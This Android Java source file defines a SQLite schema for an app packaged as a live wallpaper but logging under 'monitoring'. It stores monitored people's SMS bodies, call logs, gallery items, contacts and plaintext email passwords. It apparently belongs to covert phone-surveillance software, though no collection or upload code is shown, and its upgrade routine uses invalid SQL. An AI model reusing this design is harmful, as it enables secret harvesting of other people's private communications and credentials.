package com.livewallpaper.circle.db.controllers;

import android.content.Context;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;
import android.util.Log;

public class MonitorSQLiteHelper extends SQLiteOpenHelper {

	private static final String DB_NAME = "people.sqlite";
	private static final int VERSION = 1;

	public static final String TABLE_PEOPLE = "people";
	public static final String COLUMN_PEOPLE_ID = "_id";
	public static final String COLUMN_SETTINGS = "settings";
	public static final String COLUMN_SETTING_SMS = "setting_sms";
	public static final String COLUMN_LAST_SMS = "last_sms";
	public static final String COLUMN_SETTING_CALL = "setting_call";
	public static final String COLUMN_LAST_CALL = "last_call";
	public static final String COLUMN_SETTING_GALLERY = "setting_gallery";
	public static final String COLUMN_LAST_GALLERY = "last_gallery";
	public static final String COLUMN_SETTING_CONTACT = "setting_contact";

	public static final String TABLE_EMAIL = "email";
	public static final String COLUMN_EMAIL_ID = "_id";
	public static final String COLUMN_EMAIL_ADDRESS = "address";
	public static final String COLUMN_EMAIL_PASSWORD = "password";
	public static final String COLUMN_EMAIL_PEOPLE_ID = "_idpeople";

	public static final String TABLE_CONTACT = "contacts";
	public static final String COLUMN_CONTACT_NAME_ID = "_idname";
	public static final String COLUMN_CONTACTS_PEOPLE_ID = "_idpeople";

	public static final String TABLE_NUMBER = "number";
	public static final String COLUMN_NUMBER_CONTACTS_ID = "_idcontact";
	public static final String COLUMN_NUMBER = "num";

	public static final String TABLE_SMS = "sms";
	public static final String COLUMN_SMS_ID = "_id";
	public static final String COLUMN_SMS_ADDRESS = "address";
	public static final String COLUMN_SMS_BODY = "body";
	public static final String COLUMN_SMS_TYPE = "type";
	public static final String COLUMN_SMS_DATE = "date";
	public static final String COLUMN_SMS_PEOPLE_ID = "_idpeople";

	public static final String TABLE_CALL = "call";
	public static final String COLUMN_CALL_ID = "_id";
	public static final String COLUMN_CALL_PHONE = "phone";
	public static final String COLUMN_CALL_DATE = "date";
	public static final String COLUMN_CALL_DURACTION = "duraction";
	public static final String COLUMN_CALL_TYPE = "type";
	public static final String COLUMN_CALL_PEOPLE_ID = "_idpeople";

	public static final String TABLE_GALLERY = "gallery";
	public static final String COLUMN_GALLERY_ID = "_id";
	public static final String COLUMN_GALLERY_DATA = "data";
	public static final String COLUMN_GALLERY_TITLE = "title";
	public static final String COLUMN_GALLERY_PEOPLE_ID = "_idpeople";

	private static final String LOG_TAG = "monitoring";
	private static MonitorSQLiteHelper mInstance = null;

	public static MonitorSQLiteHelper getInstance(Context ctx) {
		if (mInstance == null) {
			mInstance = new MonitorSQLiteHelper(ctx.getApplicationContext());
		}
		return mInstance;
	}

	public MonitorSQLiteHelper(Context context) {
		super(context, DB_NAME, null, VERSION);
	}

	@Override
	public void onCreate(SQLiteDatabase db) {

		db.execSQL("CREATE TABLE IF NOT EXISTS " + TABLE_PEOPLE + " ("
				+ COLUMN_PEOPLE_ID + " TEXT PRIMARY KEY, " + COLUMN_SETTINGS
				+ " INTEGER NOT NULL, " + COLUMN_SETTING_SMS
				+ " INTEGER NOT NULL, " + COLUMN_LAST_SMS
				+ " INTEGER NOT NULL, " + COLUMN_SETTING_CALL
				+ " INTEGER NOT NULL, " + COLUMN_LAST_CALL
				+ " INTEGER NOT NULL, " + COLUMN_SETTING_GALLERY
				+ " INTEGER NOT NULL, " + COLUMN_LAST_GALLERY
				+ " INTEGER NOT NULL," + COLUMN_SETTING_CONTACT
				+ " INTEGER NOT NULL  )");

		db.execSQL("CREATE TABLE IF NOT EXISTS " + TABLE_EMAIL + " ("
				+ COLUMN_EMAIL_ADDRESS + " TEXT PRIMARY KEY, "
				+ COLUMN_EMAIL_PASSWORD + " TEXT NOT NULL, "
				+ COLUMN_EMAIL_PEOPLE_ID + " TEXT REFERENCES " + TABLE_PEOPLE
				+ "(" + COLUMN_PEOPLE_ID + "))");

		db.execSQL("CREATE TABLE IF NOT EXISTS " + TABLE_CONTACT + " ("
				+ COLUMN_CONTACT_NAME_ID + " TEXT PRIMARY KEY, "
				+ COLUMN_CONTACTS_PEOPLE_ID + " TEXT REFERENCES "
				+ TABLE_PEOPLE + "(" + COLUMN_PEOPLE_ID + "))");

		db.execSQL("CREATE TABLE IF NOT EXISTS " + TABLE_NUMBER + " ("
				+ COLUMN_NUMBER + " TEXT NOT NULL, "
				+ COLUMN_NUMBER_CONTACTS_ID + " TEXT REFERENCES "
				+ TABLE_CONTACT + "(" + COLUMN_CONTACT_NAME_ID + "))");

		db.execSQL("CREATE TABLE IF NOT EXISTS " + TABLE_SMS + " ("
				+ COLUMN_SMS_ID + " INTEGER PRIMARY KEY , "
				+ COLUMN_SMS_ADDRESS + " TEXT, " + COLUMN_SMS_BODY
				+ " TEXT NOT NULL, " + COLUMN_SMS_TYPE + " INTEGER NOT NULL, "
				+ COLUMN_SMS_DATE + " TEXT NOT NULL, " + COLUMN_SMS_PEOPLE_ID
				+ " TEXT REFERENCES " + TABLE_PEOPLE + "(" + COLUMN_PEOPLE_ID
				+ "))");

		db.execSQL("CREATE TABLE IF NOT EXISTS " + TABLE_CALL + " ("
				+ COLUMN_CALL_ID + " INTEGER PRIMARY KEY , "
				+ COLUMN_CALL_PHONE + " TEXT NOT NULL, " + COLUMN_CALL_DATE
				+ " TEXT NOT NULL, " + COLUMN_CALL_DURACTION
				+ " TEXT NOT NULL, " + COLUMN_CALL_TYPE + " INTEGER NOT NULL, "
				+ COLUMN_CALL_PEOPLE_ID + " TEXT REFERENCES " + TABLE_PEOPLE
				+ "(" + COLUMN_PEOPLE_ID + "))");

		db.execSQL("CREATE TABLE IF NOT EXISTS " + TABLE_GALLERY + " ("
				+ COLUMN_GALLERY_ID + " INTEGER PRIMARY KEY , "
				+ COLUMN_GALLERY_DATA + " TEXT NOT NULL, "
				+ COLUMN_GALLERY_TITLE + " TEXT NOT NULL, "
				+ COLUMN_GALLERY_PEOPLE_ID + " TEXT REFERENCES " + TABLE_PEOPLE
				+ "(" + COLUMN_PEOPLE_ID + "))");

		Log.i(LOG_TAG, "onCreate table ");
	}

	@Override
	public void onUpgrade(SQLiteDatabase db, int arg1, int arg2) {
		db.rawQuery("DROP DATABASE " + DB_NAME, null);
		onCreate(db);
	}

}